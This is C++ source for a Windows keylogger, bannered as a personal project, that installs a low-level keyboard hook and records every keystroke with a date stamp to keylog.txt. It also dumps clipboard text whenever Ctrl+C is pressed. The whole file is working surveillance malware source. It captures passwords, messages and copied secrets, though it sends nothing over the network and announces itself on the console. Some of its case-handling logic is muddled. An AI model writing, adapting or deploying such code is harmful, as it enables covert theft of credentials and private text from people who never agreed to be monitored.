#include <iostream>
#include <fstream>
#include <Windows.h>
#include <chrono>
#include <conio.h>
#include <iomanip>

std::ofstream logfile;

void logClipboardContent()
{
    if (!OpenClipboard(NULL))
        return; // if Clipboard Not accessiable
    
    if(IsClipboardFormatAvailable(CF_TEXT))
        {
            HANDLE hData = GetClipboardData(CF_TEXT);
            char* GetClipboardData = static_cast<char*>(GlobalLock(hData));

            if(GetClipboardData)
                {
                    logfile << "[ CLIPBOARD ] " << GetClipboardData << std::endl;
                    GlobalUnlock(hData);
                }
        }
CloseClipboard();
}

void logkeyStroke(int key) {
    if (!logfile.is_open()) {
        std::cerr << "Log file is not open." << std::endl;
        return;
    }

    // Get current time
    auto now = std::chrono::system_clock::now();
    auto now_c = std::chrono::system_clock::to_time_t(now);
    logfile << std::put_time(std::localtime(&now_c), "\n [ %d-%m-%Y ] - ") << "";

    // Handle special keys
    switch (key) {
        case VK_BACK:
            logfile << "[ BACKSPACE ]";
            break;
        case VK_RETURN:
            logfile << "[ ENTER ]";
            break;
        case VK_SPACE:
            logfile << "[ SPACE ]";
            break;
        case VK_TAB:
            logfile << "[ TAB ]";
            break;
        case VK_ESCAPE:
            logfile << "[ ESC ]";
            break;
        case VK_CAPITAL:
            logfile << "[ CAPSLOCK ]";
            break;
        
        // Handling SHIFT KeyStroke
        case VK_SHIFT:
            logfile << "[ SHIFT ]";
            break;
        case VK_LSHIFT:
            logfile << "[ LSHIFT ]";
            break;
        case VK_RSHIFT:
            logfile << "[ RSHIFT ]";
            break;

        // Handling CRTL KeyStroke
        case VK_CONTROL:
            logfile << "[ CTRL ]";
            break;
        case VK_LCONTROL:
            logfile << "[ LCTRL ]";
            break;
        case VK_RCONTROL:
            logfile << "[ RCTRL ]";
            break;

        case VK_DELETE:
            logfile << "[ DELETE ]";
            break;
        
        // Handling AlphaNumeric KeyStrokes
        default:
            if (key >= 'A' && key <= 'Z') {
                logfile << char(key);
            } else if (key >= 'a' && key <= 'z') {
                // Check if SHIFT is pressed for lowercase letters
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    logfile << char(key); // Log as lowercase
                } else {
                    logfile << "\n" << char(key - ('a' - 'A')); // Convert to uppercase
                }
            } else if (key >= '0' && key <= '9') {
                logfile << char(key);
            } else {
                logfile << "[ " << key << " ]";
            }
            break;
    }
    
    // Logging ClipBoardContent
     if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (key == 'C'))
        logClipboardContent();
    else 
        if((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (key == 'c'))
            logClipboardContent();
    std::cout << "\n[!] Logged (" << char(key) << ")";
logfile.flush(); // Ensure the log is written immediately
}

LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        logkeyStroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {

// Banner
std::cout << "--------------------------------------------------";
 std::cout << "\n _  __          _                                 ";
 std::cout << "\n| |/ /         | |                                ";
 std::cout << "\n| ' / ___ _   _| |     ___   __ _  __ _  ___ _ __ ";
 std::cout << "\n|  < / _ | | | | |    / _   / _` |/ _` |/ _ | '__|";
 std::cout << "\n| . |  __| |_| | |___| (_) | (_| | (_| |  __| |   ";
 std::cout << "\n|_| _ ___| __, |______ ___/  __, | __, | ___|_|   ";
 std::cout << "\n           __/ |             __/ | __/ |          ";
 std::cout << "\n          |___/             |___/ |___/           ";
 std::cout << "\n--------------------------------------------------";
 std::cout << "\n As a Project By @shahil-sk";
 std::cout << "\n--------------------------------------------------";
 std::cout << "\n[*] Starting Application";


    logfile.open("keylog.txt", std::ios::app);
    if (!logfile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1; // Exit if the file can't be opened
    }

    HHOOK KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
    if (!KeyboardHook) {
        std::cerr << "Failed to set keyboard hook." << std::endl;
        logfile.close();
        return 1; // Exit if hook fails
    }

    // Funtion to Keep The Program Running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        std::cout << "\n[*] Application Running";

    }

    // UnHooking the Keyboard
    UnhookWindowsHookEx(KeyboardHook);
    logfile.close(); // Close the log file when done
    std::cout << "[-] Logfile Closed";
    getch();
    return 0;
}